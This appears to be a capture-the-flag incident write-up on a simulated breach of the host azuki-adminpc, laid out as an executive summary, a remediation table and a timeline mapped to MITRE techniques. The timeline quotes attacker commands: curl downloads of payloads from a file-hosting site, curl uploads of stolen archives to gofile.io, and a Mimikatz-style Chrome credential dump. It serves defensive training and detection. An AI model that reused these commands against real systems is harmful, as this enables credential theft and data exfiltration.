# CTF-Bridge-Take-Over


# Executive Summary – Azuki Corporation Breach (CTF 3)

On 25 November 2025, the workstation **azuki-adminpc** (user: yuki.tanaka) was compromised via RDP from external IP **10.1.0.204**. The attacker conducted a rapid, methodical post-exploitation campaign lasting approximately 2 hours.

Key activities included:
- Comprehensive discovery (sessions, domain trusts, network connections, credential files)
- Deployment of a Metasploit Meterpreter payload via password-protected 7z archive downloaded from **litter.catbox.moe**
- Creation of a local staging directory `C:\ProgramData\Microsoft\Crypto\staging` mimicking legitimate Windows paths
- Theft of sensitive documents (Banking, Tax, Contracts, QuickBooks) and credentials (KeePass database + plaintext master password file **OLD-Passwords.txt**)
- Download and execution of a renamed credential dumping tool (`m.exe`) to extract Google Chrome saved passwords and cookies via DPAPI
- Exfiltration of multiple compressed archives to **store1.gofile.io** (IP: 45.112.123.227) using curl multipart uploads

The attacker demonstrated strong operational security: infrastructure rotation, LOLBAS usage, renamed tools, and cleanup of some artifacts (e.g., PsExec64.exe).

This incident highlights risks associated with exposed RDP, weak password practices, and insufficient monitoring of living-off-the-land techniques.

No evidence of lateral movement or impact (e.g., ransomware) was observed in the provided logs.

## Required Actions by Urgency

| Urgency       | Action                                                                 | Owner                  | Rationale / Notes |
|---------------|------------------------------------------------------------------------|------------------------|-------------------|
| **Immediate** (0–24 hours) | Block external IPs **10.1.0.204**, **108.181.20.36** (litter.catbox.moe), and **45.112.123.227** (gofile.io) at firewall/perimeter | Network Security       | Prevent further C2/exfil to known attacker infrastructure |
| **Immediate** | Reset passwords and enforce MFA for account **yuki.tanaka** and any other accounts with sessions from 10.1.0.204 | Identity / Service Desk| Account used for initial access and post-exploitation |
| **Immediate** | Isolate/quarantine **azuki-adminpc** for forensic imaging                 | Incident Response      | Preserve evidence; prevent further activity |
| **High** (24–48 hours)      | Search environment for persistence mechanisms (e.g., new local users, scheduled tasks, Meterpreter remnants) | IR / Endpoint Team     | Attacker had high-integrity access for extended period |
| **High**      | Review all RDP/VPN logs for connections from 10.1.0.204 and other anomalies | SOC / Identity Team    | Identify scope of initial access vector |
| **High**      | Scan for files in `C:\ProgramData\Microsoft\Crypto\staging` and `C:\Windows\Temp\cache` across endpoints | Endpoint Detection     | Detect similar staging directories |
| **High**      | Notify affected stakeholders (Finance, Legal) regarding exfiltrated documents (Banking, Tax, Contracts, QuickBooks) | Legal / Compliance     | Potential regulatory reporting obligations |
| **Medium** (3–7 days)       | Conduct full credential audit and rotation for any passwords potentially exposed via Chrome dump or KeePass master file | Identity Team          | Browser and KeePass credentials stolen |
| **Medium**    | Implement/strengthen Application Control to block execution from Temp/cache directories | Endpoint Security      | Prevent similar payload staging |
| **Medium**    | Review and tighten RDP exposure (restrict source IPs, require VPN + MFA) | Network / Identity     | Likely initial access vector |
| **Low** (ongoing)          | Add detection rules for:<br>• Named pipes matching `msf-pipe-*`<br>• curl POST uploads to file-hosting domains<br>• Execution of renamed mimikatz-like tools | Threat Hunting / SOC   | Improve future detection capability |
| **Low**       | User awareness training on password hygiene (no plaintext files like OLD-Passwords.txt) | Security Awareness     | Address root cause of credential exposure |


---
# Azuki Corporation Breach – Chronological Attack Timeline (CTF 3)

**Date:** 25 November 2025  
**Primary Compromised Host:** azuki-adminpc (10.1.0.108)  
**Initial Victim User:** yuki.tanaka  

| Time (approx.)          | Stage                  | TTP                                      | Description & Evidence |
|-------------------------|------------------------|------------------------------------------|------------------------|
| ~4:06–4:09 AM           | Initial Access & Discovery | Logon via RDP (implied)                  | Multiple successful logons from 10.1.0.204 (attacker IP) as yuki.tanaka. RDP session established. |
| 4:08:58 AM              | Discovery              | T1033 – System Owner/User Discovery      | `qwinsta.exe` executed (shorthand for query session) to enumerate active RDP sessions. |
| 4:09:07 AM              | Discovery              | T1033                                    | `"""query.exe"" user` executed for additional session enumeration. |
| 4:09:25–4:09:38 AM      | Discovery              | T1482 – Domain Trust Discovery           | `"""nltest.exe"" /domain_trusts /all_trusts` run twice to map all domain trust relationships. |
| 4:10:07 AM              | Discovery              | T1049 – System Network Connections Discovery | `"""NETSTAT.EXE"" -ano` executed to list active connections and owning PIDs. |
| 4:13:45 AM              | Discovery              | T1552.001 – Credentials in Files         | `where /r C:\Users *.kdbx` recursively searches all user profiles for KeePass databases. |
| 4:15:52 AM              | Credential Access      | T1552.001                                | `"""notepad.exe"" C:\Users\yuki.tanaka\Desktop\OLD-Passwords.txt` – attacker views plaintext password file (poor hygiene). |
| 4:21:11 AM              | Execution / Ingress Tool Transfer | T1105 / T1204                            | `"""curl.exe"" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` – downloads masqueraded initial payload. |
| 4:21:32 AM              | Execution              | T1140 – Deobfuscate/Decode Files         | `"""7z.exe"" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y` – extracts payload (including meterpreter.exe). |
| 4:24:35 AM              | Command and Control    | T1090.001 – Proxy (Named Pipes)          | Named pipe created: `\\Device\\NamedPipe\\msf-pipe-5902` (Metasploit Meterpreter C2 indicator). |
| ~4:28–4:37 AM           | Collection             | T1074.001 – Data Staged                  | Multiple robocopy commands copy high-value folders (QuickBooks, Banking, Tax-Records, Contracts) to staging directory `C:\ProgramData\Microsoft\Crypto\staging`. |
| 4:39:16 AM              | Collection             | T1119 – Automated Collection             | `"""tar.exe"" -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt` – archives KeePass DB + plaintext master password. |
| 4:41:51 AM              | Exfiltration           | T1567 – Exfil Over Web Service           | First upload: `"""curl.exe"" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile` (to IP 45.112.123.227). |
| 4:42:04–4:42:33 AM      | Exfiltration           | T1567                                    | Subsequent uploads of quickbooks-data.tar.gz, banking-records.tar.gz, tax-documents.tar.gz, contracts-data.tar.gz via same curl command to gofile.io. |
| 4:49:19 AM              | Exfiltration           | T1567                                    | `chrome-credentials.tar.gz` uploaded. |
| 5:55:34 AM              | Credential Access      | T1105                                    | Second payload download: `"""curl.exe"" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` (reusing litter.catbox.moe). |
| 5:55:44 AM              | Credential Access      | T1140                                    | Extraction: `"""7z.exe"" x m-temp.7z -p******** -y` → produces `m.exe` (renamed Mimikatz-like tool). |
| 5:55:54 AM              | Credential Access      | T1555.003 – Credentials from Web Browsers| `"""m.exe"" privilege::debug ""dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect"" exit` – dumps Chrome saved passwords via DPAPI. |
| 5:56:42 AM              | Collection             | T1119                                    | `"""tar.exe"" -czf chrome-session-theft.tar.gz chrome-real-dump.txt Chrome-Cookies.db` – packages Chrome credential dump. |
| 5:56:50 AM              | Exfiltration           | T1567                                    | Final upload: `"""curl.exe"" -X POST -F file=@chrome-session-theft.tar.gz https://store1.gofile.io/uploadFile`. |
| ~5:58–6:10 AM           | Cleanup / Impact Prep  | -                                        | PsExec64.exe briefly downloaded to staging, later deleted. Possible preparation for lateral movement or impact (not executed in logs). |

## Key Infrastructure Summary

- **Initial Staging Host:** litter.catbox.moe (108.181.20.36)
- **Exfiltration Host:** store1.gofile.io → 45.112.123.227
- **Staging Directory:** `C:\ProgramData\Microsoft\Crypto\staging` (LOLBAS camouflage)
- **C2 Indicator:** Metasploit named pipe `msf-pipe-5902`

This was a highly realistic post-exploitation chain: RDP initial access → thorough discovery → credential theft → data staging → multi-stage exfiltration using public file-hosting services.
